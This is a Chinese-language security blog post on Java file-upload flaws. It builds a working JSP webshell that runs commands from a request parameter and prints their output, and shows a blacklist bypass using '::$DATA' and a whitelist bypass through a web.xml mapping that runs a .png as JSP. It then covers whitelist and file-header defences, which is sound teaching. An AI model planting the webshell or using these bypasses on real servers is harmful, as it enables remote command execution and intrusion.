## 1.前期准备(JSP一句话分析)

本文主要讲解文件上传方面的代码分析以及如何防御。

在此之前，在网上无意间看到好多种JSP的一句话。但是直接ctrl+c~v拿过来用发现有缺陷

    
    
    <%Runtime.getRuntime().exec(request.getParameter("i"));%>

![1636464658_618a78127e06389b84a75.png!small](https://image.3001.net/images/20211109/1636464658_618a78127e06389b84a75.png!small)

可以发现，执行命令完是无回显的，所以自己打算稍作改进一下。

![1636464716_618a784cda0a997e06e1b.png!small](https://image.3001.net/images/20211109/1636464716_618a784cda0a997e06e1b.png!small)

### JSP一句话分析：

本来以为Runtime.getRuntime().exec()执行完成之后，可以直接通过response写入到页面。

    
    
    <%response.getWriter().println( Runtime.getRuntime().exec(request.getParameter("i")));%>

但是发现输出的是一个对象：

![1636465130_618a79ea51a17f52de8e6.png!small](https://image.3001.net/images/20211109/1636465130_618a79ea51a17f52de8e6.png!small)

### JSP一句话改进(实现带回显功能):

于是乎进行改进，通过BufferedReader的readLine()进行读取，最后在通过response写入到页面即可。

完整JSP小马：

    
    
    <%@ page import="java.io.InputStream" %>
    <%@ page import="java.io.InputStreamReader" %>
    <%@ page import="java.io.BufferedReader" %>
    <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
    <%
        Process p = Runtime.getRuntime().exec(request.getParameter("i"));
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        response.getWriter().println("-----------");
        String line;
        while((line = reader.readLine())!=null){
            response.getWriter().println(line);
        }
        
    %>  
      
    

带回显功能测试：

![1636465340_618a7abc828d642e7e157.png!small](https://image.3001.net/images/20211109/1636465340_618a7abc828d642e7e157.png!small)

## 2.文件上传分析

这个项目，是很早之前内网的一个项目，拿出来给大家分享，当时上线测试这个项目的时候，发现的问题

。这里将部分代码摘要做简单修改过来拿出来给大家分享。

### File.jsp 代码

    
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>File</title>
    </head>
    <body>
    <form action="/smbms/uploads" enctype="multipart/form-data" method="post">
        <input type="file" name="file">
        <input type="submit">
    </form>
    </body>
    </html>

### Uploads Servlet 代码

Uploads Servlet如下

    
    
    package com.met32.Files;  
      
    import org.apache.commons.fileupload.FileItem;  
    import org.apache.commons.fileupload.FileItemFactory;  
    import org.apache.commons.fileupload.disk.DiskFileItemFactory;  
    import org.apache.commons.fileupload.servlet.ServletFileUpload;  
      
    import javax.servlet.ServletException;  
    import javax.servlet.annotation.WebServlet;  
    import javax.servlet.http.HttpServlet;  
    import javax.servlet.http.HttpServletRequest;  
    import javax.servlet.http.HttpServletResponse;  
    import java.io.File;  
    import java.io.IOException;  
    import java.util.List;  
    @WebServlet("/uploads")  
    public class UploadFile extends HttpServlet{  
    @Override  
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
    doGet(req, resp);  
    }  
      
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
    req.setCharacterEncoding("utf-8");  
    if(ServletFileUpload.isMultipartContent(req)){  
    FileItemFactory factory = new DiskFileItemFactory();  
    ServletFileUpload upload = new ServletFileUpload(factory);  
    try {  
    List<FileItem> list = upload.parseRequest(req);  
      
    for(FileItem fileItem:list){  
    if(!fileItem.isFormField()){  
    int i = fileItem.getName().lastIndexOf('.');  
    if(i>0){  
    String fileType = fileItem.getName().substring(i+1);  
    System.out.println("上传的类型为："+fileType);  
    if(!fileType.equals("jsp")){  
    System.out.println("上传成功！");  
    System.out.println("上传的文件名："+fileItem.getName());  
    fileItem.write(new File("E:\\code\\java\\smbms\\src\\main\\webapp"+fileItem.getName()));  
    }else{  
    System.out.println("非法上传，文件后缀为"+fileType);  
    }  
    }  
      
    }  
      
    }  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
      
    }  
      
    }

追到这部分，这是做了黑名单判断，绕过的话就很easy了。

    
    
    if(!fileType.equals("jsp")){
       System.out.println("上传成功！");
       System.out.println("上传的文件名："+fileItem.getName());
       fileItem.write(new File("E:\\code\\java\\smbms\\src\\main\\webapp"+fileItem.getName()));
    }else  
    {  
    System.out.println("非法上传，文件后缀为"+fileType);  
    }

看一下正常情况，被拦截掉：

![](https://image.3001.net/images/20211112/1636715995_618e4ddb2bdda79f02bac.png!small)之后使用::$DATA直接绕过即可。![](https://image.3001.net/images/20211112/1636716017_618e4df16e7ae0f9fecbb.png!small)

![1636466239_618a7e3f612e78d4528c3.png!small](https://image.3001.net/images/20211109/1636466239_618a7e3f612e78d4528c3.png!small)

## 3.文件上传防御

在上方文件上传，直接凉了。所以在此写了几种防御姿势。

### 3.1白名单限制

这里直接写的白名单限制，直接将后缀限定"死"即可。

通过 String fileType = fileItem.getName().substring(i+1);获取到后缀，并使用equals进行限制。

    
    
    @WebServlet("/uploads")
    public class UploadFile extends HttpServlet{
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            doGet(req, resp);
        }
    
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            req.setCharacterEncoding("utf-8");
            if(ServletFileUpload.isMultipartContent(req)){
                     FileItemFactory factory = new DiskFileItemFactory();
                    ServletFileUpload upload = new ServletFileUpload(factory);
                    try {
                        List<FileItem> list = upload.parseRequest(req);
    
                        for(FileItem fileItem:list){
                            if(!fileItem.isFormField()){
                                int i = fileItem.getName().lastIndexOf('.');
                                if(i>0){
                                    String fileType = fileItem.getName().substring(i+1);
                                    System.out.println("上传的类型为："+fileType);
                                    if(fileType.equals("png")){
                                        System.out.println("上传成功！");
                                        System.out.println("上传的文件名："+fileItem.getName());
                                        fileItem.write(new File("web根路径"+fileItem.getName()));
                                    }else{
                                        System.out.println("非法上传，文件后缀为"+fileType);
                                    }
                                }
    
                            }
    
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
    
        }
    
    }  
      
    

现在测试一下，成功拦截掉非png后缀的：

![1636467179_618a81eb36a1dcfff9b80.png!small](https://image.3001.net/images/20211109/1636467179_618a81eb36a1dcfff9b80.png!small)

### 白名单绕过

到这里，是不是以为白名单就非常安全了？nonono。。

假设管理员粗心大意，修改了xml配置。

这样就会造成了白名单的绕过，而png就会当做jsp脚本来执行

    
    
    web.xml文件配置如下  
    <servlet>
        <servlet-name>tomcatpooljsp</servlet-name>
        <jsp-file>/test.jsp</jsp-file>
      </servlet>
      <servlet-mapping>
        <servlet-name>tomcatpooljsp</servlet-name>
        <url-pattern>/test.png</url-pattern>
      </servlet-mapping>  
      
    

直接上传一个png格式的jsp一句话，成功绕过。

![1636468813_618a884de0da60fbc8f42.png!small?1636468835328](https://image.3001.net/images/20211109/1636468813_618a884de0da60fbc8f42.png!small?1636468835328)

### 3.2其它方式防御

这里是看到网上之前分享的防御姿势，但是吧....感觉安全性还是不如白名单高。

代码如下，通过判断文件头来进行下一步操作。(ps：自己看看就好)

    
    
    // 获得文件头部字符串
        public static String bytesToHexString(byte[] src) {
            StringBuilder stringBuilder = new StringBuilder();
            if (src == null || src.length <= 0) {
                return null;
            }
            for (int i = 0; i < src.length; i++) {
                int v = src[i] & 0xFF;
                String hv = Integer.toHexString(v);
                if (hv.length() < 2) {
                    stringBuilder.append(0);
                }
                stringBuilder.append(hv);
            }
            return stringBuilder.toString();
        }
            FILE_TYPE_MAP.put("jpg", "FFD8FF"); //JPEG      
            FILE_TYPE_MAP.put("png", "89504E47"); //PNG      
            FILE_TYPE_MAP.put("gif", "47494638"); //GIF  

## 4.结尾

其实总体而言，白名单校验是目前本人感觉最为安全的一种，当然网上有很多种其它防御手段。例如content-type校验，黑名单校验等，但是都存在很大几率绕过的风险！

